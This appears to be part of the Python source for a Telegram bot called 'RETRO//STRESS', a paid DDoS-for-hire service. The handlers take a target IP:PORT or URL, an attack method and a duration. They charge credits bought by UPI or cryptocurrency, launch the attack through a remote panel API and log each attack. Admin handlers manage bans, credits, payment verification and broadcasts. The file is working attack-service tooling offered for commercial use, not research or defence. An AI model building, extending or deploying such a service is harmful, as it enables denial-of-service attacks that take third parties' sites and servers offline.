                f"✅ Method: **{method}**\n\n"
                f"🎯 Enter target URL:\n"
                f"`https://example.com`\n\n"
                f"Include http:// or https://",
                reply_markup=back_button(),
                parse_mode="Markdown"
            )
        
        await state.set_state(UserStates.waiting_for_attack_target)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in method callback: {e}")

@dp.message(UserStates.waiting_for_attack_target)
async def process_attack_target(message: types.Message, state: FSMContext):
    try:
        target = message.text.strip()
        data = await state.get_data()
        attack_type = data.get("attack_type")
        
        # Validate target
        if attack_type == "L4":
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', target):
                await message.answer(
                    "❌ Invalid format! Please use IP:PORT format.\n"
                    "Example: `192.168.1.1:80`",
                    reply_markup=back_button(),
                    parse_mode="Markdown"
                )
                return
            ip, port = target.split(":")
            port = int(port)
        else:
            if not target.startswith(("http://", "https://")):
                await message.answer(
                    "❌ Invalid URL! Please include http:// or https://",
                    reply_markup=back_button()
                )
                return
            port = 80 if target.startswith("http://") else 443
        
        await state.update_data(target=target, port=port)
        
        await message.answer(
            "⏱️ Select attack duration:\n\n"
            "Cost: 10 credits per 60 seconds",
            reply_markup=duration_menu()
        )
    except Exception as e:
        logger.error(f"Error in attack_target handler: {e}")
        await message.answer("❌ An error occurred. Please try again.")

@dp.callback_query(F.data.startswith("dur_"))
async def process_duration(callback: types.CallbackQuery, state: FSMContext):
    try:
        duration_data = callback.data.replace("dur_", "")
        
        if duration_data == "custom":
            await callback.message.edit_text(
                "⏱️ Enter custom duration in seconds (30-300):\n\n"
                "Cost: 10 credits per 60 seconds",
                reply_markup=back_button()
            )
            await state.set_state(UserStates.waiting_for_attack_duration)
        else:
            duration = int(duration_data)
            await state.update_data(duration=duration)
            await confirm_attack(callback, state)
        
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in duration callback: {e}")

@dp.message(UserStates.waiting_for_attack_duration)
async def process_custom_duration(message: types.Message, state: FSMContext):
    try:
        duration = int(message.text.strip())
        if duration < 30 or duration > 300:
            await message.answer("❌ Duration must be between 30 and 300 seconds!")
            return
        
        await state.update_data(duration=duration)
        
        # Create a fake callback to reuse confirm_attack
        class FakeCallback:
            def __init__(self, message):
                self.message = message
                self.from_user = message.from_user
            
            async def answer(self, text=None, show_alert=False):
                pass
        
        await confirm_attack(FakeCallback(message), state)
        
    except ValueError:
        await message.answer("❌ Please enter a valid number!")
    except Exception as e:
        logger.error(f"Error in custom_duration handler: {e}")

async def confirm_attack(callback, state: FSMContext):
    try:
        data = await state.get_data()
        target = data.get("target")
        method = data.get("method")
        duration = data.get("duration")
        port = data.get("port")
        
        cost = calculate_attack_cost(duration)
        
        confirm_text = (
            f"⚠️ **Confirm Attack**\n\n"
            f"🎯 Target: `{target}`\n"
            f"⚡ Method: {method}\n"
            f"⏱️ Duration: {duration} seconds\n"
            f"💰 Cost: {cost} credits\n\n"
            f"Are you sure you want to proceed?"
        )
        
        await callback.message.answer(
            confirm_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Launch Attack", callback_data="confirm_attack")],
                [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel_attack")]
            ]),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Error in confirm_attack: {e}")

@dp.callback_query(F.data == "confirm_attack")
async def execute_attack(callback: types.CallbackQuery, state: FSMContext):
    try:
        user_id = callback.from_user.id
        data = await state.get_data()
        
        target = data.get("target")
        method = data.get("method")
        duration = data.get("duration")
        port = data.get("port")
        cost = calculate_attack_cost(duration)
        
        # Check credits again
        if not db.deduct_credits(user_id, cost):
            await callback.message.edit_text(
                "❌ Insufficient credits!\n\n"
                "Please purchase more credits.",
                reply_markup=main_menu(user_id)
            )
            await state.clear()
            await callback.answer()
            return
        
        # Get user's access key
        user_data = db.get_user(user_id)
        access_key = user_data['access_key']
        
        # Launch attack
        status_msg = await callback.message.edit_text(
            f"🚀 Launching attack...\n\n"
            f"🎯 Target: `{target}`\n"
            f"⏱️ Duration: {duration}s",
            parse_mode="Markdown"
        )
        
        result = await panel_api.launch_attack(access_key, target, method, port, duration)
        
        if result['success']:
            db.log_attack(user_id, target, method, port, duration, "success", 
                         json.dumps(result['data']))
            db.increment_attacks(user_id)
            
            await status_msg.edit_text(
                f"✅ **Attack Launched Successfully!**\n\n"
                f"🎯 Target: `{target}`\n"
                f"⚡ Method: {method}\n"
                f"⏱️ Duration: {duration} seconds\n"
                f"💰 Deducted: {cost} credits\n\n"
                f"📊 Check status with /status",
                reply_markup=main_menu(user_id),
                parse_mode="Markdown"
            )
            
            # Log to channel
            await log_to_channel(
                f"🚨 **Attack Launched**\n\n"
                f"👤 User: {user_id}\n"
                f"🎯 Target: {target}\n"
                f"⚡ Method: {method}\n"
                f"⏱️ Duration: {duration}s"
            )
        else:
            # Refund credits
            db.add_credits(user_id, cost)
            db.log_attack(user_id, target, method, port, duration, "failed", 
                         result.get('error', 'Unknown error'))
            
            await status_msg.edit_text(
                f"❌ **Attack Failed!**\n\n"
                f"Error: {result.get('error', 'Unknown error')}\n"
                f"💰 Credits refunded: {cost}\n\n"
                f"Contact {OWNER_USERNAME} if this persists.",
                reply_markup=main_menu(user_id)
            )
        
        await state.clear()
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in execute_attack: {e}")
        await callback.answer("Error occurred", show_alert=True)

@dp.callback_query(F.data == "cancel_attack")
async def cancel_attack(callback: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await callback.message.edit_text(
            "❌ Attack cancelled.",
            reply_markup=main_menu(callback.from_user.id)
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in cancel_attack: {e}")

# ============ CALLBACK HANDLERS - PAYMENT SYSTEM ============
@dp.callback_query(F.data.startswith("buy_"))
async def process_buy_package(callback: types.CallbackQuery):
    try:
        package = callback.data.replace("buy_", "")
        
        if package not in PRICE_LIST:
            await callback.answer("Invalid package!", show_alert=True)
            return
        
        await callback.message.edit_text(
            f"💰 **Payment for {PRICE_LIST[package]['name']}**\n\n"
            f"📦 Package: {PRICE_LIST[package]['name']}\n"
            f"💎 Credits: {PRICE_LIST[package]['credits']}\n"
            f"💵 Price: ₹{PRICE_LIST[package]['price']}\n\n"
            f"Select payment method:",
            reply_markup=payment_method_menu(package)
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in buy_package callback: {e}")

@dp.callback_query(F.data.startswith("pay_upi_"))
async def process_upi_payment(callback: types.CallbackQuery, state: FSMContext):
    try:
        package = callback.data.replace("pay_upi_", "")
        
        await state.update_data(package=package, payment_method="upi")
        
        await callback.message.edit_text(
            f"📱 **UPI Payment Instructions**\n\n"
            f"💰 Amount: ₹{PRICE_LIST[package]['price']}\n"
            f"📦 Package: {PRICE_LIST[package]['name']}\n\n"
            f"**Payment Details:**\n"
            f"UPI ID: `{PAYMENT_METHODS['upi']}`\n\n"
            f"**Steps:**\n"
            f"1. Send ₹{PRICE_LIST[package]['price']} to above UPI ID\n"
            f"2. Take screenshot of payment\n"
            f"3. Send screenshot here with transaction ID\n\n"
            f"⚠️ Credits will be added within 15 minutes after verification.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ I've Paid - Send Screenshot", callback_data="send_payment_proof")],
                [InlineKeyboardButton(text="🔙 Back", callback_data="buy_credits")]
            ]),
            parse_mode="Markdown"
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in upi_payment callback: {e}")

@dp.callback_query(F.data.startswith("pay_crypto_"))
async def process_crypto_payment(callback: types.CallbackQuery, state: FSMContext):
    try:
        package = callback.data.replace("pay_crypto_", "")
        
        await state.update_data(package=package, payment_method="crypto")
        
        await callback.message.edit_text(
            f"₿ **Cryptocurrency Payment**\n\n"
            f"💰 Amount: ₹{PRICE_LIST[package]['price']} (equivalent in crypto)\n"
            f"📦 Package: {PRICE_LIST[package]['name']}\n\n"
            f"**Wallet Address:**\n"
            f"`{PAYMENT_METHODS['crypto']}`\n\n"
            f"**Steps:**\n"
            f"1. Send equivalent crypto to above address\n"
            f"2. Take screenshot of transaction\n"
            f"3. Send screenshot here with transaction hash\n\n"
            f"⚠️ Credits will be added after 2 confirmations.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ I've Paid - Send Screenshot", callback_data="send_payment_proof")],
                [InlineKeyboardButton(text="🔙 Back", callback_data="buy_credits")]
            ]),
            parse_mode="Markdown"
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in crypto_payment callback: {e}")

@dp.callback_query(F.data == "send_payment_proof")
async def process_send_proof(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.edit_text(
            "📤 **Send Payment Proof**\n\n"
            "Please send:\n"
            "1. Screenshot of payment\n"
            "2. Transaction ID/Reference number\n\n"
            "Type the transaction ID after sending screenshot, or send both together.",
            reply_markup=back_button()
        )
        await state.set_state(UserStates.waiting_for_payment_screenshot)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in send_proof callback: {e}")

@dp.message(UserStates.waiting_for_payment_screenshot, F.photo)
async def process_payment_screenshot(message: types.Message, state: FSMContext):
    try:
        # Store photo file_id
        photo_id = message.photo[-1].file_id
        await state.update_data(photo_id=photo_id)
        
        await message.answer(
            "✅ Screenshot received!\n\n"
            "Now please enter the transaction ID or reference number:",
            reply_markup=back_button()
        )
        await state.set_state(UserStates.waiting_for_transaction_id)
    except Exception as e:
        logger.error(f"Error in payment_screenshot handler: {e}")

@dp.message(UserStates.waiting_for_transaction_id)
async def process_transaction_id(message: types.Message, state: FSMContext):
    try:
        transaction_id = message.text.strip()
        data = await state.get_data()
        
        package = data.get("package")
        payment_method = data.get("payment_method")
        photo_id = data.get("photo_id")
        user_id = message.from_user.id
        
        # Save payment to database
        payment_id = db.add_payment(
            user_id, 
            package, 
            PRICE_LIST[package]['price'], 
            payment_method, 
            transaction_id
        )
        
        # Forward to owner for verification
        await bot.send_message(
            OWNER_ID,
            f"💰 **New Payment Pending**\n\n"
            f"🆔 Payment ID: {payment_id}\n"
            f"👤 User: {user_id}\n"
            f"📦 Package: {PRICE_LIST[package]['name']}\n"
            f"💵 Amount: ₹{PRICE_LIST[package]['price']}\n"
            f"💳 Method: {payment_method.upper()}\n"
            f"📝 Transaction ID: `{transaction_id}`\n\n"
            f"To verify: /verify_{payment_id}",
            parse_mode="Markdown"
        )
        
        # Forward screenshot if exists
        if photo_id:
            await bot.send_photo(OWNER_ID, photo_id, caption=f"Payment proof from user {user_id}")
        
        await message.answer(
            f"✅ **Payment Submitted!**\n\n"
            f"🆔 Payment ID: {payment_id}\n"
            f"⏳ Status: Pending Verification\n\n"
            f"Your credits will be added within 15 minutes.\n"
            f"Contact {OWNER_USERNAME} if delayed.",
            reply_markup=main_menu(user_id)
        )
        
        await state.clear()
    except Exception as e:
        logger.error(f"Error in transaction_id handler: {e}")
        await message.answer("❌ An error occurred. Please try again.")

# ============ CALLBACK HANDLERS - ADMIN PANEL ============
@dp.callback_query(F.data == "admin_panel")
async def process_admin_panel(callback: types.CallbackQuery):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "⚙️ **Admin Panel**\n\n"
            f"👤 Welcome, Admin!\n"
            f"Select an option:",
            reply_markup=admin_panel_menu()
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_panel callback: {e}")

@dp.callback_query(F.data == "admin_users")
async def process_admin_users(callback: types.CallbackQuery):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "👥 **User Management**\n\n"
            "Select an action:",
            reply_markup=admin_user_menu()
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_users callback: {e}")

@dp.callback_query(F.data == "admin_ban_user")
async def process_admin_ban(callback: types.CallbackQuery, state: FSMContext):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "🚫 **Ban User**\n\n"
            "Enter the user ID to ban:",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_user_id_ban)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_ban callback: {e}")

@dp.message(AdminStates.waiting_for_user_id_ban)
async def execute_ban_user(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        db.ban_user(user_id)
        
        await message.answer(
            f"✅ User {user_id} has been banned.",
            reply_markup=admin_panel_menu()
        )
        
        try:
            await bot.send_message(user_id, "🚫 You have been banned from using this bot.")
        except:
            pass
        
        await log_to_channel(f"🚫 User {user_id} banned by {message.from_user.id}")
        
    except ValueError:
        await message.answer("❌ Invalid user ID!")
        return
    except Exception as e:
        logger.error(f"Error in execute_ban: {e}")
    
    await state.clear()

@dp.callback_query(F.data == "admin_unban_user")
async def process_admin_unban(callback: types.CallbackQuery, state: FSMContext):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "✅ **Unban User**\n\n"
            "Enter the user ID to unban:",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_user_id_unban)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_unban callback: {e}")

@dp.message(AdminStates.waiting_for_user_id_unban)
async def execute_unban_user(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        db.unban_user(user_id)
        
        await message.answer(
            f"✅ User {user_id} has been unbanned.",
            reply_markup=admin_panel_menu()
        )
        
        try:
            await bot.send_message(user_id, "✅ You have been unbanned!")
        except:
            pass
        
    except ValueError:
        await message.answer("❌ Invalid user ID!")
        return
    except Exception as e:
        logger.error(f"Error in execute_unban: {e}")
    
    await state.clear()

@dp.callback_query(F.data == "admin_add_admin")
async def process_add_admin(callback: types.CallbackQuery, state: FSMContext):
    try:
        if callback.from_user.id != OWNER_ID:
            await callback.answer("❌ Only owner can add admins!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "➕ **Add Admin**\n\n"
            "Enter the user ID to promote as admin:",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_admin_id)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in add_admin callback: {e}")

@dp.message(AdminStates.waiting_for_admin_id)
async def execute_add_admin(message: types.Message, state: FSMContext):
    try:
        admin_id = int(message.text.strip())
        db.set_admin(admin_id, True)
        
        await message.answer(
            f"✅ User {admin_id} is now an admin.",
            reply_markup=admin_panel_menu()
        )
        
        try:
            await bot.send_message(
                admin_id, 
                "🎉 You've been promoted to admin!\n"
                "Use /admin to access admin panel."
            )
        except:
            pass
        
    except ValueError:
        await message.answer("❌ Invalid user ID!")
        return
    except Exception as e:
        logger.error(f"Error in execute_add_admin: {e}")
    
    await state.clear()

@dp.callback_query(F.data == "admin_add_credits")
async def process_add_credits(callback: types.CallbackQuery, state: FSMContext):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "💰 **Add Credits to User**\n\n"
            "Step 1/2: Enter user ID:",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_add_credits_user)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in add_credits callback: {e}")

@dp.message(AdminStates.waiting_for_add_credits_user)
async def process_add_credits_user(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user=user_id)
        
        await message.answer(
            "Step 2/2: Enter amount of credits to add:",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_add_credits_amount)
        
    except ValueError:
        await message.answer("❌ Invalid user ID!")

@dp.message(AdminStates.waiting_for_add_credits_amount)
async def execute_add_credits(message: types.Message, state: FSMContext):
    try:
        amount = int(message.text.strip())
        data = await state.get_data()
        user_id = data.get("target_user")
        
        db.add_credits(user_id, amount)
        
        await message.answer(
            f"✅ Added {amount} credits to user {user_id}",
            reply_markup=admin_panel_menu()
        )
        
        try:
            await bot.send_message(
                user_id,
                f"🎉 {amount} credits have been added to your account!"
            )
        except:
            pass
        
    except ValueError:
        await message.answer("❌ Invalid amount!")
        return
    except Exception as e:
        logger.error(f"Error in execute_add_credits: {e}")
    
    await state.clear()

@dp.callback_query(F.data == "admin_payments")
async def process_admin_payments(callback: types.CallbackQuery):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        payments = db.get_pending_payments()
        
        if not payments:
            await callback.message.edit_text(
                "💰 No pending payments.",
                reply_markup=admin_panel_menu()
            )
            await callback.answer()
            return
        
        text = "💰 **Pending Payments:**\n\n"
        for payment in payments:
            text += (
                f"🆔 ID: {payment['id']}\n"
                f"👤 User: {payment['user_id']}\n"
                f"📦 Package: {payment['package']}\n"
                f"💵 Amount: ₹{payment['amount']}\n"
                f"📝 TXN ID: {payment['transaction_id']}\n"
                f"To verify: /verify_{payment['id']}\n\n"
            )
        
        await callback.message.edit_text(text, reply_markup=admin_panel_menu())
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_payments callback: {e}")

@dp.callback_query(F.data == "admin_broadcast")
async def process_admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        await callback.message.edit_text(
            "📢 **Broadcast Message**\n\n"
            "Send the message you want to broadcast to all users.",
            reply_markup=back_button()
        )
        await state.set_state(AdminStates.waiting_for_broadcast)
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_broadcast callback: {e}")

@dp.message(AdminStates.waiting_for_broadcast)
async def execute_broadcast(message: types.Message, state: FSMContext):
    try:
        users = db.get_all_users()
        
        sent = 0
        failed = 0
        
        status_msg = await message.answer(f"📤 Broadcasting to {len(users)} users...")
        
        for user_id in users:
            try:
                if message.text:
                    await bot.send_message(user_id, message.text)
                elif message.photo:
                    await bot.send_photo(user_id, message.photo[-1].file_id, caption=message.caption)
                elif message.video:
                    await bot.send_video(user_id, message.video.file_id, caption=message.caption)
                elif message.document:
                    await bot.send_document(user_id, message.document.file_id, caption=message.caption)
                sent += 1
            except Exception as e:
                failed += 1
                logger.debug(f"Failed to send to {user_id}: {e}")
            
            if sent % 50 == 0:
                await status_msg.edit_text(f"📤 Sent: {sent}/{len(users)}...")
            
            await asyncio.sleep(0.05)
        
        await status_msg.edit_text(
            f"✅ **Broadcast Complete**\n"
            f"📤 Sent: {sent}\n"
            f"❌ Failed: {failed}",
            reply_markup=admin_panel_menu()
        )
        await state.clear()
    except Exception as e:
        logger.error(f"Error in execute_broadcast: {e}")
        await state.clear()

@dp.callback_query(F.data == "admin_stats")
async def process_admin_stats(callback: types.CallbackQuery):
    try:
        if not db.is_admin(callback.from_user.id):
            await callback.answer("❌ Access denied!", show_alert=True)
            return
        
        conn = sqlite3.connect("retrostress_bot.db")
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = 1')
        banned_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM attack_logs')
        total_attacks = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(credits) FROM users')
        total_credits = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM payments WHERE status = "pending"')
        pending_payments = cursor.fetchone()[0]
        
        conn.close()
        
        stats_text = (
            f"📊 **Bot Statistics**\n\n"
            f"👥 Total Users: {total_users}\n"
            f"🚫 Banned Users: {banned_users}\n"
            f"💰 Total Credits: {total_credits}\n"
            f"💥 Total Attacks: {total_attacks}\n"
            f"⏳ Pending Payments: {pending_payments}\n\n"
            f"⏱️ Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        await callback.message.edit_text(stats_text, reply_markup=admin_panel_menu())
        await callback.answer()
    except Exception as e:
        logger.error(f"Error in admin_stats callback: {e}")

# ============ VERIFICATION COMMAND ============
@dp.message(Command("verify"))
async def cmd_verify(message: types.Message):
    try:
        if not db.is_admin(message.from_user.id):
            await message.answer("❌ You don't have permission!")
            return
        
        args = message.text.split()
        if len(args) < 2:
            await message.answer("Usage: /verify <payment_id>")
            return
        
        try:
            payment_id = int(args[1].replace("_", ""))
        except ValueError:
            await message.answer("❌ Invalid payment ID!")
            return
        
        # Get payment details
        conn = sqlite3.connect("retrostress_bot.db")
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM payments WHERE id = ?', (payment_id,))
        payment = cursor.fetchone()
        
        if not payment:
            await message.answer("❌ Payment not found!")
            return
        
        columns = [description[0] for description in cursor.description]
        payment_dict = dict(zip(columns, payment))
        
        if payment_dict['status'] != 'pending':
            await message.answer("❌ Payment already processed!")
            return
        
        # Verify payment
        db.verify_payment(payment_id, message.from_user.id)
        
        # Add credits to user
        package = payment_dict['package']
        credits = PRICE_LIST[package]['credits']
        db.add_credits(payment_dict['user_id'], credits)
        
        # Notify user
        try:
            await bot.send_message(
                payment_dict['user_id'],
                f"✅ **Payment Verified!**\n\n"
                f"🆔 Payment ID: {payment_id}\n"
                f"💎 Credits Added: {credits}\n"
                f"💰 New Balance: {db.get_user(payment_dict['user_id'])['credits']}\n\n"
                f"Thank you for your purchase!"
            )
        except:
            pass
        
        await message.answer(
            f"✅ Payment {payment_id} verified!\n"
            f"Added {credits} credits to user {payment_dict['user_id']}"
        )
        
        await log_to_channel(
            f"💰 **Payment Verified**\n\n"
            f"🆔 ID: {payment_id}\n"
            f"👤 User: {payment_dict['user_id']}\n"
            f"💎 Credits: {credits}\n"
            f"👮 Verified by: {message.from_user.id}"
        )
        
    except Exception as e:
        logger.error(f"Error in verify command: {e}")
        await message.answer("❌ An error occurred. Please try again.")

# ============ CHAT MEMBER HANDLERS ============
@dp.chat_member(ChatMemberUpdatedFilter(IS_NOT_MEMBER >> IS_MEMBER))
async def on_user_join(event: ChatMemberUpdated):
    try:
        if event.chat.type in ["group", "supergroup"]:
            db.add_group(event.chat.id, event.chat.title or "Unknown", event.from_user.id)
            logger.info(f"Added group {event.chat.id}")
    except Exception as e:
        logger.error(f"Error in chat_member handler: {e}")

# ============ ERROR HANDLERS ============
@dp.errors()
async def error_handler(update: types.Update, exception: Exception):
    logger.error(f"Update {update} caused error {exception}")
    
    try:
        await bot.send_message(
            OWNER_ID,
            f"⚠️ **Bot Error**\n\n"
            f"Error: `{str(exception)[:400]}`\n"
            f"Update type: {type(update).__name__}",
            parse_mode="Markdown"
        )
    except:
        pass
    
    return True

# ============ MAIN ENTRY POINT ============
async def set_bot_commands():
    commands = [
        BotCommand(command="start", description="Start the bot"),
        BotCommand(command="setkey", description="Set your access key"),
        BotCommand(command="status", description="Check your status"),
        BotCommand(command="attack", description="Launch attack"),
        BotCommand(command="buy", description="Buy credits (INR)"),
        BotCommand(command="contact", description="Contact owner"),
        BotCommand(command="help", description="Show help"),
    ]
    
    try:
        await bot.set_my_commands(commands)
    except Exception as e:
        logger.error(f"Error setting commands: {e}")

async def on_startup():
    logger.info("Bot starting up...")
    
    # Set commands
    await set_bot_commands()
    
    # Ensure owner exists
    try:
        owner = await bot.get_chat(OWNER_ID)
        db.add_user(OWNER_ID, owner.username, owner.first_name, owner.last_name)
        db.set_admin(OWNER_ID, True)
        logger.info(f"Owner initialized: {OWNER_ID}")
    except Exception as e:
        logger.error(f"Could not initialize owner: {e}")
    
    # Notify owner
    try:
        await bot.send_message(
            OWNER_ID,
            "🤖 **RETRO//STRESS Bot Started!**\n\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"✅ Bot is now operational",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Could not notify owner: {e}")

async def main():
    await on_startup()
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped!")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
